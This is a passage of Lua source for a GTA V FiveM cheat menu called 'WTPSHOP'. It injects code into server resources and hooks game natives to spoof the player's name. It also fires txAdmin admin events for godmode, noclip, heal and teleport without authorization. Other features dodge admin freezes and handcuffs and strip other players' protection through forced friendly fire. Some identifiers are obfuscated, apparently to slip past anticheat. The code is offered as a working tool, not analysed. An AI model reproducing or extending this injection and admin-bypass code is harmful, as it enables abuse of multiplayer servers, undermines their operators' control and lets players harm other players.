                                                -- SetTextOutline()
                                                SetTextEntry("STRING")
                                                SetTextCentre(1)
                                                AddTextComponentString(text)
                                                DrawText(_x, _y)
                                            end
                                        end
                                    ]])
                                else
                                    executeCode("any", [[
                                        fgawjFmaDjdALaO = false
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Movement" },
                        {
                            type = "slider-checkbox",
                            label = "Noclip",
                            scrollType = "onScroll",
                            checked = false,
                            value = 1.0,
                            step = 1.0,
                            min = 1.0,
                            max = 12.0,
                            onSelect = function(sliderValue, checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        setNoclipAllow = true
                                        setNoclipActive = true
                                        setNoclipSpeed = ]] .. sliderValue .. [[

                                        local function getCamDirection()
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
                                            local pitch = GetGameplayCamRelativePitch()
                                            local x = -math.sin(math.rad(heading)) * math.cos(math.rad(pitch))
                                            local y = math.cos(math.rad(heading)) * math.cos(math.rad(pitch))
                                            local z = math.sin(math.rad(pitch))
                                            return vector3(x, y, z)
                                        end

                                        if not setNoclipThreads then
                                            setNoclipThreads = true

                                            WTPSHOP.Native(CreateThread, function()
                                                while setNoclipAllow do
                                                    Wait(0)
                                                    if setNoclipActive and setNoclipAllow then
                                                        local setPed = PlayerPedId()
                                                        local pos = WTPSHOP.Native(GetEntityCoords, setPed)
                                                        local move = vector3(0, 0, 0)
                                                        local camDir = getCamDirection()

                                                        if WTPSHOP.Native(IsControlPressed, 0, 32) then move = move + (camDir * setNoclipSpeed) end
                                                        if WTPSHOP.Native(IsControlPressed, 0, 33) then move = move - (camDir * setNoclipSpeed) end
                                                        if WTPSHOP.Native(IsControlPressed, 0, 34) then move = move + (vector3(-camDir.y, camDir.x, 0) * setNoclipSpeed) end
                                                        if WTPSHOP.Native(IsControlPressed, 0, 35) then move = move + (vector3(camDir.y, -camDir.x, 0) * setNoclipSpeed) end
                                                        if WTPSHOP.Native(IsControlPressed, 0, 46) then move = move + vector3(0, 0, -setNoclipSpeed) end
                                                        if WTPSHOP.Native(IsControlPressed, 0, 44) then move = move + vector3(0, 0, setNoclipSpeed) end
                                                        if WTPSHOP.Native(IsControlPressed, 0, 21) then move = move * 2.5 end

                                                        if #(move) > 0.01 then
                                                            local newPos = pos + (move * 0.1)
                                                            WTPSHOP.Native(SetEntityCoordsNoOffset, setPed, newPos.x, newPos.y, newPos.z, true, true, true)
                                                        end

                                                        local camHeading = GetGameplayCamRelativeHeading() + GetEntityHeading(setPed)
                                                        WTPSHOP.Native(SetEntityHeading, setPed, camHeading % 360)

                                                        WTPSHOP.Native(FreezeEntityPosition, setPed, true)
                                                    else
                                                        local setPed = PlayerPedId()
                                                        WTPSHOP.Native(FreezeEntityPosition, setPed, false)
                                                    end
                                                end
                                                setNoclipThreads = false
                                            end)
                                        end
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        setNoclipAllow = false
                                        setNoclipActive = false
                                    ]])
                                end
                            end
                        },
                        { type = "slider-checkbox", label = "Freecam", scrollType = "onScroll", checked = false, value = 0.25, step = 0.25, min = 0.25, max = 5.0,
                            onSelect = function(sliderValue, checked)
                                self:ToggleFreecam(checked, sliderValue)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fast Run",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        FastRun = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while FastRun do
                                                WTPSHOP.Native(SetRunSprintMultiplierForPlayer, PlayerId(), 1.49)
                                                WTPSHOP.Native(SetPedMoveRateOverride, PlayerPedId(), 3.0)
                                                Wait(1)
                                            end
                                            WTPSHOP.Native(SetRunSprintMultiplierForPlayer, PlayerId(), 1.0)
                                            WTPSHOP.Native(SetPedMoveRateOverride, PlayerPedId(), 1.0)
                                        end)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        FastRun = false
                                    ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Super Jump", checked = false,
                            onSelect = function(checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        SuperJumpToggle = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while SuperJumpToggle do
                                                WTPSHOP.Native(SetSuperJumpThisFrame, PlayerId())
                                                Wait(0)
                                            end
                                        end)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[ SuperJumpToggle = false ]])
                                end
                            end
                        },
                    }
                },
                {
                    label = "Miscellaneous",
                    tabs = {
                        { icon = "", type = "button", label = "Suicide", desc = "This will kill you.",
                            onSelect = function()
                                local function RGybF0JqEt()
                                    local aSdFgHjKlQwErTy = SetEntityHealth
                                    aSdFgHjKlQwErTy(PlayerPedId(), 0)
                                end
                                RGybF0JqEt()
                            end
                        },
                        { icon = "", type = "button", label = "Force Ragdoll", desc = "This will ragdoll.",
                            onSelect = function()
                                executeCode("any", [[
                                    WTPSHOP.Native(SetPedToRagdoll, PlayerPedId(), 3000, 3000, 0, false, false, false)
                                ]])
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Primary", "Secondary" }, label = "Clear Tasks", desc = "Clears the character's tasks",
                            onSelect = function(value)
                                if value == "Primary" then
                                    ClearPedTasksImmediately(PlayerPedId())
                                else
                                    if value == "Secondary" then
                                        ClearPedSecondaryTask(PlayerPedId())
                                    end
                                end
                            end
                        },
                        {
                            type = "button",
                            label = "Spoofed Name",
                            desc = "This will change your deathcam name.",
                            onSelect = function()
                                KeyboardInput("Spoofed Name", "", function(val)
                                    if val and val ~= "" then
                                        HookNative(0x6D0DE6A7B5DA71F8, function() return false, val end)
                                    else
                                        WTPSHOP:Notify("Invalid input", "Please enter a valid Spoofed Name.", "error")
                                    end
                                end, "typeable")
                            end
                        },
                        {
                            type = "button",
                            label = "Hold Peak",
                            onSelect = function()
                                KeyboardInput("Enter Key (e.g. E, LALT, LSHIFT)", "E", function(val)
                                    if val and val ~= "" then
                                        local key = val:upper()
                                        local keyTable = {
                                            ["E"] = 38, ["Q"] = 44, ["LSHIFT"] = 21, ["LALT"] = 19,
                                            ["SPACE"] = 22, ["TAB"] = 37, ["CAPS"] = 137, ["R"] = 45,
                                            ["F"] = 49, ["G"] = 47, ["X"] = 73, ["Z"] = 20,
                                            ["F1"] = 112, ["F2"] = 113, ["F3"] = 114, ["F4"] = 115, ["F5"] = 116, 
                                            ["F6"] = 117, ["F7"] = 118, ["F8"] = 119, ["F9"] = 120, ["F10"] = 121, 
                                            ["F11"] = 122, ["F12"] = 123,
                                            ["1"] = 49, ["2"] = 50, ["3"] = 51, ["4"] = 52, ["5"] = 53, 
                                            ["6"] = 54, ["7"] = 55, ["8"] = 56, ["9"] = 57, ["0"] = 48, 
                                            ["-"] = 189, ["="] = 187, ["`"] = 192,
                                            ["W"] = 87, ["T"] = 84, ["Y"] = 89, ["U"] = 85, ["I"] = 73, ["O"] = 79, ["P"] = 80,
                                            ["A"] = 65, ["S"] = 83, ["D"] = 68, ["H"] = 72, ["J"] = 74, ["K"] = 75, ["L"] = 76,
                                            ["C"] = 67, ["V"] = 86, ["B"] = 66, ["N"] = 78, ["M"] = 77,
                                            ["ESCAPE"] = 27, ["BACKSPACE"] = 8, ["ENTER"] = 13, ["CONTROL"] = 17, 
                                            ["DELETE"] = 46, ["PAGEUP"] = 33, ["PAGEDOWN"] = 34, ["HOME"] = 36, ["END"] = 35,
                                            ["INSERT"] = 121, ["CAPSLOCK"] = 20,
                                            ["UP"] = 38, ["DOWN"] = 40, ["LEFT"] = 37, ["RIGHT"] = 39,
                                            ["["] = 219, ["]"] = 221, ["\\"] = 220, [";"] = 186, ["'"] = 222,
                                            [","] = 188, ["."] = 190, ["/"] = 191
                                        }
                                        _G.CustomPeakKeyID = keyTable[key] or 38
                                        _G.RubberbandEnabled = true

                                        self:Notify("success", "WTPSHOP", "Hold Active! Hold: " .. key, 3000)

                                        if not _G.PeakThreadRunning then
                                            _G.PeakThreadRunning = true
                                            CreateThread(function()
                                                local startCoords = nil
                                                while _G.RubberbandEnabled do
                                                    local peakKeyID = _G.CustomPeakKeyID

                                                    if IsControlJustPressed(0, peakKeyID) then
                                                        startCoords = GetEntityCoords(PlayerPedId())
                                                    end

                                                    if IsControlJustReleased(0, peakKeyID) and startCoords then
                                                        SetEntityCoordsNoOffset(PlayerPedId(), startCoords.x, startCoords.y, startCoords.z, false, false, false)
                                                        startCoords = nil
                                                    end

                                                    Wait(0)
                                                end
                                                _G.PeakThreadRunning = false
                                            end)
                                        end
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "No Ragdoll",
                            checked = false,
                            desc = "This will prevent you from being ragdolled from admins or cheaters.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        if _G.NoRagdollThread then return end

                                        _G.NoRagdoll = true
                                        _G.NoRagdollThread = WTPSHOP.Thread(function()
                                            while _G.NoRagdoll do
                                                WTPSHOP.Wait(0)
                                                local ped = WTPSHOP.Native(PlayerPedId)
                                                if WTPSHOP.Native(DoesEntityExist, ped) and not WTPSHOP.Native(IsEntityDead, ped) then
                                                    WTPSHOP.Native(SetPedCanRagdoll, ped, false)
                                                    WTPSHOP.Native(ClearPedTasks, ped)
                                                    WTPSHOP.Native(SetEntityProofs, ped, false, true, false, false, false, false, true, false)
                                                end
                                            end
                                            _G.NoRagdollThread = nil
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[
                                        _G.NoRagdoll = false

                                        local ped = PlayerPedId()
                                        if DoesEntityExist(ped) and not IsEntityDead(ped) then
                                            SetPedCanRagdoll(ped, true)
                                            SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                                        end
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Freeze",
                            checked = false,
                            desc = "This will prevent you from being frozen.",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.AntiFreeze = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.AntiFreeze do
                                                local ped = PlayerPedId()
                                                if WTPSHOP.Native(IsEntityPositionFrozen, ped) then
                                                    WTPSHOP.Native(FreezeEntityPosition, ped, false)
                                                    WTPSHOP.Native(ClearPedTasksImmediately, ped)
                                                end
                                                WTPSHOP.Native(SetPlayerControl, PlayerId(), true, 0)
                                                WTPSHOP.Native(Wait, 1)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ _G.AntiFreeze = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-VDM",
                            checked = false,
                            desc = "Disables vehicle collision with you",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.AntiVDMEnabled = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.AntiVDMEnabled do
                                                local pCoords = GetEntityCoords(PlayerPedId())
                                                for _, vehicle in ipairs(GetGamePool("CVehicle")) do
                                                    if WTPSHOP.Native(DoesEntityExist, vehicle) then
                                                        local vCoords = GetEntityCoords(vehicle)
                                                        local dist = #(pCoords - vCoords)
                                                        if dist <= 50.0 then
                                                            WTPSHOP.Native(SetEntityNoCollisionEntity, vehicle, PlayerPedId(), true)
                                                        end
                                                    end
                                                end
                                                WTPSHOP.Native(Wait, 0)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[
                                        _G.AntiVDMEnabled = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Collision",
                            checked = false,
                            desc = "Disables collision",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.NoCollision = true
                                        WTPSHOP.Native(CreateThread, function()
                                            local ped = PlayerPedId()
                                            while _G.NoCollision do
                                                WTPSHOP.Native(SetEntityCollision, ped, false, false)
                                                WTPSHOP.Native(SetEntityInvincible, ped, true)

                                                local pos = GetEntityCoords(ped)
                                                local rayStart = vector3(pos.x, pos.y, pos.z + 1.0)
                                                local rayEnd = vector3(pos.x, pos.y, pos.z - 10.0)
                                                local rayHandle = StartShapeTestRay(rayStart.x, rayStart.y, rayStart.z, rayEnd.x, rayEnd.y, rayEnd.z, -1, ped, 7)
                                                local _, hit, hitPos, _, _ = GetShapeTestResult(rayHandle)

                                                if not hit then
                                                    WTPSHOP.Native(SetEntityCoordsNoOffset, ped, pos.x, pos.y, pos.z + 1.0, false, false, false)
                                                elseif pos.z < hitPos.z + 0.5 then
                                                    WTPSHOP.Native(SetEntityCoordsNoOffset, ped, pos.x, pos.y, hitPos.z + 0.5, false, false, false)
                                                end

                                                WTPSHOP.Native(Wait, 10)
                                            end

                                            WTPSHOP.Native(SetEntityCollision, ped, true, true)
                                            WTPSHOP.Native(SetEntityInvincible, ped, false)
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ _G.NoCollision = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Drag",
                            checked = false,
                            desc = "Prevents being dragged",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        if AntiDrag == nil then AntiDrag = false end
                                        AntiDrag = true

                                        WTPSHOP.Native(CreateThread, function()
                                            while AntiDrag do
                                                local ped = PlayerPedId()
                                                if WTPSHOP.Native(IsEntityAttached, ped) then
                                                    WTPSHOP.Native(DetachEntity, ped, true, false)
                                                end
                                                WTPSHOP.Native(ClearPedSecondaryTask, ped)
                                                WTPSHOP.Native(SetEnableHandcuffs, ped, false)
                                                if WTPSHOP.Native(DoesEntityExist, Handcuffs) then WTPSHOP.Native(DeleteEntity, Handcuffs) end
                                                if WTPSHOP.Native(DoesEntityExist, handcuff) then WTPSHOP.Native(DeleteEntity, handcuff) end
                                                WTPSHOP.Native(FreezeEntityPosition, ped, false)
                                                WTPSHOP.Native(Wait, 200)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ AntiDrag = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Attach",
                            checked = false,
                            desc = "Anti Attach ped/vehicles etc",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.AntiAttach = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.AntiAttach do
                                                WTPSHOP.Native(Wait, 350)
                                                local ped = PlayerPedId()
                                                if DoesEntityExist(ped) then
                                                    if WTPSHOP.Native(IsEntityAttachedToAnyObject, ped) or WTPSHOP.Native(IsEntityAttachedToAnyVehicle, ped) or WTPSHOP.Native(IsEntityAttachedToAnyPed, ped) or WTPSHOP.Native(IsEntityAttachedToAnyEntity, ped) then
                                                        WTPSHOP.Native(DetachEntity, ped, true, false)
                                                    end
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ _G.AntiAttach = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Cuff",
                            checked = false,
                            desc = "Clears cuff state.",
                            onSelect = function(checked)
                                WTPSHOP:ToggleAntiCuff(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Carry",
                            checked = false,
                            desc = "Detach from carry animations.",
                            onSelect = function(checked)
                                WTPSHOP:ToggleAntiCarry(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Crash (NPC)",
                            checked = false,
                            desc = "Deletes hostile nearby NPC peds.",
                            onSelect = function(checked)
                                WTPSHOP:ToggleAntiCrashPeds(checked)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Passive Mode",
                            checked = false,
                            desc = "Cant shoot players/players cant shoot you",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        _G.PassiveModeActive = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.PassiveModeActive do
                                                WTPSHOP.Native(SetPedConfigFlag, PlayerPedId(), 423, true)
                                                Wait(1000)
                                            end
                                        end)
                                    ]])
                                else
                                    executeCode('any', [[ 
                                        _G.PassiveModeActive = false 
                                        WTPSHOP.Native(SetPedConfigFlag, PlayerPedId(), 423, false)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Friendly Fire",
                            checked = false,
                            desc = "You will kill other player's using passive mode",
                            onSelect = function(checked)
                                if checked then
                                    executeCode('any', [[
                                        local playerPed = PlayerPedId()
                                        WTPSHOP.Native(NetworkSetFriendlyFireOption, true)
                                        WTPSHOP.Native(SetCanAttackFriendly, playerPed, true, true)
                                        WTPSHOP.Native(DisablePlayerFiring, playerPed, false)
                                        EnableAllControlActions(0)
                                        EnableAllControlActions(1)

                                        for _, playerId in ipairs(GetActivePlayers()) do
                                            local targetPed = GetPlayerPed(playerId)
                                            if targetPed ~= playerPed then
                                                WTPSHOP.Native(SetPedConfigFlag, targetPed, 2, false)
                                                WTPSHOP.Native(SetPedConfigFlag, targetPed, 423, false)
                                                WTPSHOP.Native(SetPedConfigFlag, targetPed, 425, false)
                                                WTPSHOP.Native(SetEntityInvincible, targetPed, false)
                                            end
                                        end
                                    ]])
                                else
                                    executeCode('any', [[
                                        local playerPed = PlayerPedId()
                                        WTPSHOP.Native(NetworkSetFriendlyFireOption, false)
                                        WTPSHOP.Native(SetCanAttackFriendly, playerPed, false, false)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Infinite Stamina",
                            checked = false,
                            desc = "This will enable Infinite Stamina.",
                            onSelect = function(checked)
                                if checked then
                                    WTPSHOP:Notify("success", "WTPSHOP", "Infinite Stamina On", 3000)
                                    ApiRasclat.Monitor([[
                                        infiniteStamina = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while infiniteStamina do
                                                WTPSHOP.Native(ResetPlayerStamina, PlayerId())
                                                Wait(30)
                                            end
                                        end)
                                    ]])
                                else
                                    WTPSHOP:Notify("error", "WTPSHOP", "Infinite Stamina Off", 3000)
                                    ApiRasclat.Monitor([[ infiniteStamina = false ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Super Punch",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        superPunch = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while superPunch do
                                                WTPSHOP.Native(SetWeaponDamageModifier, GetHashKey('WEAPON_UNARMED'), 500.0)
                                                WTPSHOP.Native(Wait, 0)
                                            end
                                        end)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        superPunch = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fast Punch",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        _G.FastPunchEnabled = true
                                        WTPSHOP.Native(CreateThread, function()
                                            while _G.FastPunchEnabled do
                                                Wait(750)
                                                local ped = PlayerPedId()
                                                if IsPedOnFoot(ped) and not IsPedInAnyVehicle(ped, false) and GetSelectedPedWeapon(ped) == GetHashKey("WEAPON_UNARMED") then
                                                    if IsControlPressed(0, 24) or IsControlPressed(0, 257) then
                                                        Wait(750)
                                                        ClearPedTasksImmediately(ped)
                                                    end
                                                end
                                            end
                                        end)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        _G.FastPunchEnabled = false
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Auto Teleport To Waypoint",
                            checked = false,
                            onSelect = function(checked)
                                _G.AutoTeleport = checked

                                if checked then
                                    CreateThread(function()
                                        while _G.AutoTeleport do
                                            if IsWaypointActive() then
                                                ApiRasclat.Monitor([[
                                                    WTPSHOP.Native(TriggerEvent, 'txcl:tpToWaypoint')
                                                ]])
                                                self:Notify("info", "WTPSHOP", "Auto Teleporting...", 2000)
                                                while IsWaypointActive() and _G.AutoTeleport do
                                                    Wait(1000)
                                                end
                                            end

                                            Wait(500)
                                        end
                                    end)
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Solo Session",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResource2(AsThreadNs, 'any', [[
                                        if _G.WTPSHOPSoloSessionThread then return end
                                        _G.WTPSHOPSoloSessionThread = true
                                        NetworkStartSoloTutorialSession()
                                        _G.WTPSHOPSoloSessionThread = CreateThread(function()
                                            while _G.WTPSHOPSoloSessionThread do Wait(1000) end
                                            NetworkEndTutorialSession()
                                            _G.WTPSHOPSoloSessionThread = nil
                                        end)
                                    ]])
                                else
                                    MachoInjectResource2(AsThreadNs, 'any', [[
                                            _G.WTPSHOPSoloSessionThread = false
                                        CreateThread(function()
                                            while _G.WTPSHOPSoloSessionThread do Wait(50) end
                                            _G.WTPSHOPSoloSessionThread = nil
                                        end)
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "txAdmin Options" },
                        { type = "checkbox", label = "txAdmin Player IDs", checked = false, desc = "This will toggle txAdmin Player ids.",
                            onSelect = function(checked)
                                if checked then
                                    MachoInjectResource2(AsThreadNs, 'monitor', [[
                                        menuIsAccessible = true
                                        toggleShowPlayerIDs(true, true)
                                    ]])
                                else
                                    MachoInjectResource2(AsThreadNs, 'monitor', [[
                                        menuIsAccessible = true
                                        toggleShowPlayerIDs(false, true)
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Noclip",
                            checked = false,
                            desc = "This will toggle txAdmin noclip.",
                            onSelect = function(checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        WTPSHOP.Native(TriggerEvent, "txcl:setPlayerMode", "noclip", true)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        WTPSHOP.Native(TriggerEvent, "txcl:setPlayerMode", "none", true)
                                    ]])
                                end
                            end,
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin Godmode",
                            checked = false,
                            desc = "This will toggle txAdmin godmode.",
                            onSelect = function(checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        WTPSHOP.Native(TriggerEvent, "txcl:setPlayerMode", "godmode", true)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        WTPSHOP.Native(TriggerEvent, "txcl:setPlayerMode", "none", true)
                                    ]])
                                end
                            end,
                        },
                        {
                            type = "checkbox",
                            label = "txAdmin SuperJump",
                            checked = false,
                            desc = "This will toggle txAdmin superjump.",
                            onSelect = function(checked)
                                if checked then
                                    ApiRasclat.Monitor([[
                                        WTPSHOP.Native(TriggerEvent, "txcl:setPlayerMode", "superjump", true)
                                    ]])
                                else
                                    ApiRasclat.Monitor([[
                                        WTPSHOP.Native(TriggerEvent, "txcl:setPlayerMode", "none", true)
                                    ]])
                                end
                            end,
                        },
                        { icon = "", type = "button", label = "txAdmin Heal",
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    WTPSHOP.Native(TriggerEvent, 'txcl:heal', -1)
                                ]])
                            end
                        },
                        { label = 'txAdmin Teleport To Waypoint', desc = "this will teleport you to waypoint", type = 'button',
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    WTPSHOP.Native(TriggerEvent, 'txcl:tpToWaypoint')
                                ]])
                            end
                        },
                        { label = 'txAdmin Fix Vehicle', desc = "this will fix your car", type = 'button',
                            onSelect = function()
                                ApiRasclat.Monitor([[
                                    WTPSHOP.Native(TriggerEvent, 'txcl:vehicle:fix')
                                ]])
                            end
                        },
                    }
                },
                {
                    label = "Wardrobe",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Random" }, label = "Outfit", desc = "Apply a preset outfit",
                            onSelect = function(value)
                                if value == "Random" then
                                    executeCode("any", [[
                                        local function UxrKYLp378()
                                            local UwEsDxCfVbGtHy = PlayerPedId
                                            local FdSaQwErTyUiOp = GetNumberOfPedDrawableVariations
                                            local QwAzXsEdCrVfBg = SetPedComponentVariation
                                            local LkJhGfDsAqWeRt = SetPedHeadBlendData
                                            local MnBgVfCdXsZaQw = SetPedHairColor
                                            local RtYuIoPlMnBvCx = GetNumHeadOverlayValues
                                            local TyUiOpAsDfGhJk = SetPedHeadOverlay
                                            local ErTyUiOpAsDfGh = SetPedHeadOverlayColor
                                            local DfGhJkLzXcVbNm = ClearPedProp

                                            local function PqLoMzNkXjWvRu(component, exclude)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                if total <= 1 then return 0 end
                                                local choice = exclude
                                                while choice == exclude do
                                                    choice = math.random(0, total - 1)
                                                end
                                                return choice
                                            end

                                            local function OxVnBmCxZaSqWe(component)
                                                local ped = UwEsDxCfVbGtHy()
                                                local total = FdSaQwErTyUiOp(ped, component)
                                                return total > 1 and math.random(0, total - 1) or 0
                                            end

                                            local ped = UwEsDxCfVbGtHy()

                                            QwAzXsEdCrVfBg(ped, 11, PqLoMzNkXjWvRu(11, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 6, PqLoMzNkXjWvRu(6, 15), 0, 2)
                                            QwAzXsEdCrVfBg(ped, 8, 15, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 3, 0, 0, 2)
                                            QwAzXsEdCrVfBg(ped, 4, OxVnBmCxZaSqWe(4), 0, 2)

                                            local face = math.random(0, 45)
                                            local skin = math.random(0, 45)
                                            LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                                            local hairMax = FdSaQwErTyUiOp(ped, 2)
                                            local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                                            QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                                            MnBgVfCdXsZaQw(ped, 0, 0)

                                            local brows = RtYuIoPlMnBvCx(2)
                                            TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                                            ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                                            DfGhJkLzXcVbNm(ped, 0)
                                            DfGhJkLzXcVbNm(ped, 1)
                                        end

                                        UxrKYLp378()
                                    ]])
                                end
                            end
                        },
                        { type = "divider", label = "Ped Options" },
                        {
                            type = "scrollable",
                            label = "Freemode",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Freemode Male", "Freemode Female"
                            },
                            onSelect = function(value)
                                executeCode("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Freemode Male" then pedModel = "mp_m_freemode_01"
                                    elseif selected == "Freemode Female" then pedModel = "mp_f_freemode_01"
                                    end

                                    if pedModel then
                                        local modelHash = GetHashKey(pedModel)
                                        RequestModel(modelHash)
                                        while not HasModelLoaded(modelHash) do
                                            Wait(0)
                                        end

                                        SetPlayerModel(PlayerId(), modelHash)
                                        SetModelAsNoLongerNeeded(modelHash)

                                        local playerPed = PlayerPedId()
                                        SetPedDefaultComponentVariation(playerPed)
                                        SetPedRandomComponentVariation(playerPed, true)
                                        SetPedRandomProps(playerPed)
                                        SetEntityInvincible(playerPed, false)
                                        ClearPedTasksImmediately(playerPed)
                                    end
                                ]]):format(value))
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Peds",
                            scrollType = "onEnter",
                            value = 1,
                            values = {
                                "Michael", "Franklin", "Trevor", "Lamar", "Jimmy", "Amanda", "Tracey", "Ron", "Wade", "Dave Norton", 
                                "Steve Haines", "Devin Weston", "Floyd", "Chef", "Lester", "Chop", "Brad", 
                                "Police Officer Male", "Police Officer Female", "SWAT", "Sheriff Male", "Sheriff Female",
                                "Highway Cop", "FIB Male", "FIB Female", "Paramedic", "Firefighter", "Doctor",
                                "Construction Worker", "Pilot Male", "Pilot Female", "Business Male", "Business Female",
                                "Street Dealer", "Gang Male 1", "Gang Male 2", "Gang Female 1", "Ballas 1", "Ballas 2", "Ballas Female",
                                "Families 1", "Families 2", "Vagos 1", "Vagos 2", "Lost MC 1", "Lost MC 2", "Lost MC Female",
                                "Army Soldier", "Marine 1", "Marine 2", "Prisoner Male", "Prison Guard", "Cop Undercover",
                                "Security Guard", "Janitor", "Hobo Male", "Hobo Female", "Prostitute 1", "Prostitute 2",
                                "Beach Male", "Beach Female", "Tourist Male", "Tourist Female", "Skater", "Hipster Male", "Hipster Female",
                                "Bouncer", "Shopkeeper", "Chef", "Bartender", "Waiter", "Mechanic", "Taxi Driver", "Gardener", "Farmer",
                                "Dock Worker", "Trash Worker", "Postal Worker", "Bus Driver", "Pilot", "Air Hostess",
                                "Cop Traffic", "Cop Detective", "Agent", "Reporter", "News Cameraman",
                                "Hunter", "Hiker Male", "Hiker Female", "Golfer Male", "Golfer Female", "Tennis Player Male", "Tennis Player Female"
                            },
                            onSelect = function(value)
                                executeCode("any", ([[
                                    local selected = "%s"
                                    local pedModel = nil

                                    if selected == "Michael" then pedModel = "player_zero"
                                    elseif selected == "Franklin" then pedModel = "player_one"
                                    elseif selected == "Trevor" then pedModel = "player_two"
                                    elseif selected == "Lamar" then pedModel = "ig_lamardavis"
                                    elseif selected == "Jimmy" then pedModel = "ig_jimmydisanto"
                                    elseif selected == "Amanda" then pedModel = "ig_amandatownley"
                                    elseif selected == "Tracey" then pedModel = "ig_tracydisanto"
                                    elseif selected == "Ron" then pedModel = "ig_ronsch"
                                    elseif selected == "Wade" then pedModel = "ig_wade"
                                    elseif selected == "Dave Norton" then pedModel = "ig_davenorton"
                                    elseif selected == "Steve Haines" then pedModel = "ig_stevehains"
                                    elseif selected == "Devin Weston" then pedModel = "ig_devin"
                                    elseif selected == "Floyd" then pedModel = "ig_floyd"
                                    elseif selected == "Chef" then pedModel = "ig_chef"
                                    elseif selected == "Lester" then pedModel = "ig_lestercrest"
                                    elseif selected == "Chop" then pedModel = "a_c_chop"
                                    elseif selected == "Brad" then pedModel = "ig_brad"
                                    elseif selected == "Police Officer Male" then pedModel = "s_m_y_cop_01"
                                    elseif selected == "Police Officer Female" then pedModel = "s_f_y_cop_01"
                                    elseif selected == "SWAT" then pedModel = "s_m_y_swat_01"
                                    elseif selected == "Sheriff Male" then pedModel = "s_m_y_sheriff_01"
